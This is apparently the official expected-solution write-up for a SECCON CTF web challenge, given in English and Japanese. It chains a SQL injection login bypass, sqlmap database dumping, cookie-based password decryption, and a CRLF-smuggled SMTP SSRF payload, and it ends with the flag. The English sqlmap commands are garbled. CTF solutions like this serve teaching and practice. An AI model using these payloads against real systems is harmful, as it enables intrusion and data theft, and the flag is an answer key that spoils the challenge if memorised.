@@ -1,0 +1,96 @@
+SQL injection + password decrypt + wget SSRF combination challenge.
+
+##Expected solution##
+1. Access http://sqlsrf.pwn.seccon.jp/sqlsrf/
+
+2. Get the source code from the backup file in the list
+ http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi_backup20171129
+
+3. Login with SQL injection at http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi
+Username: 'union select' edb7e51d077dfc079c564dd3db1e0323
+Password: x
+
+4. Execute netstat in login menu and check the status of smtp server
+
+5. From the notation of the menu after login, understand the necessity of login with admin
+
+6. Get table list and column list with sqlmap
+
+./sqlmap.py --url "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?user='union select 'edb7e51d077dfc079c564dd3db1e0323 & pass = x & login = Login" - p user - string =' location = '- dbms = sqlite - level = 5 - rrisk = 3 - technique = BEQSU
+
+7. Get data with sql-shell of sqlmap
+
+./sqlmap.py --url "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?user='union select 'edb7e51d077dfc079c564dd3db1e0323 & pass = x & login = Login" - p user - string =' location = '- dbms = sqlite --level = 5 --risk = 3 - technique = BEQSU --sql - shell
+
+sql-shell> select username, password from users
+
+8. Acquire admin's encrypted password d2f37e101c0e76bcc90b5634a5510f64
+
+9. Set it to Cookie "remember", display index.cgi, decrypt the password
+
+10. Login as admin
+
+11. With SSRF, send mail to root with your source as your address
+
+127.0.0.1%0d%0aMAIL FROM%3aYOURMAIL%40ADDRESS.EXAMPLE.JP%0d%0aRCPT TO%3aroot%0d%0aDATA%0d%0aSubject%3agive me flag%0d%0a%0d%0a.%0d%0aQUIT%0d%0a:25/
+
+※ set your own address to YOURMAIL@ADDRESS.EXAMPLE.JP 
+
+12. E-mail recieve
+
+Encrypted-FLAG: 37208e07f86ba78a7416ecd535fd874a3b98b964005a5503bcaa41a1c9b42a19
+
+
+13. When this is decoded, a flag comes up
+
+SECCON {SSRFisMyFriend!}
+
+
+
+---
+SQLインジェクション ＋ パスワードのdecrypt ＋ wgetのSSRF の組み合わせ問題です。
+
+●想定解
+１．http://sqlsrf.pwn.seccon.jp/sqlsrf/ を表示
+
+２．一覧の中の、バックアップファイルから、ソースコードを取得
+　http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi_backup20171129
+
+３．http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi に SQLインジェクションでログイン
+　username: 'union select 'edb7e51d077dfc079c564dd3db1e0323
+　password: x
+
+４．ログイン後のメニューで netstat を実行し、smtp サーバの状態を確認
+
+５．ログイン後のメニューの表記から、admin でのログインの必要性を理解
+
+６．sqlmap で、テーブル一覧とカラム一覧を取得
+
+./sqlmap.py --url "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?user='union select 'edb7e51d077dfc079c564dd3db1e0323&pass=x&login=Login" -p user --string='location=' --dbms=sqlite --level=5 --risk=3 --technique=BEQSU
+
+７．sqlmap の sql-shell で、データを取得
+
+./sqlmap.py --url "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?user='union select 'edb7e51d077dfc079c564dd3db1e0323&pass=x&login=Login" -p user --string='location=' --dbms=sqlite --level=5 --risk=3 --technique=BEQSU --sql-shell
+
+sql-shell> select username,password from users
+
+８．admin の、暗号化済みパスワード d2f37e101c0e76bcc90b5634a5510f64 を取得
+
+９．Cookie「remember」にセットして index.cgi を表示して、パスワードを解読
+
+１０．admin としてログイン
+
+１１．SSRF で、送信元を自分のアドレスにして、root にメールを送信
+
+127.0.0.1%0d%0aMAIL FROM%3aYOURMAIL%40ADDRESS.EXAMPLE.JP%0d%0aRCPT TO%3aroot%0d%0aDATA%0d%0aSubject%3agive me flag%0d%0a%0d%0a.%0d%0aQUIT%0d%0a:25/
+
+※YOURMAIL@ADDRESS.EXAMPLE.JP を自分のアドレスに
+
+１２．メールが届く
+
+Encrypted-FLAG: 37208e07f86ba78a7416ecd535fd874a3b98b964005a5503bcaa41a1c9b42a19
+
+１３．これを解読すると、フラグが出て来る
+
+SECCON{SSRFisMyFriend!}
+
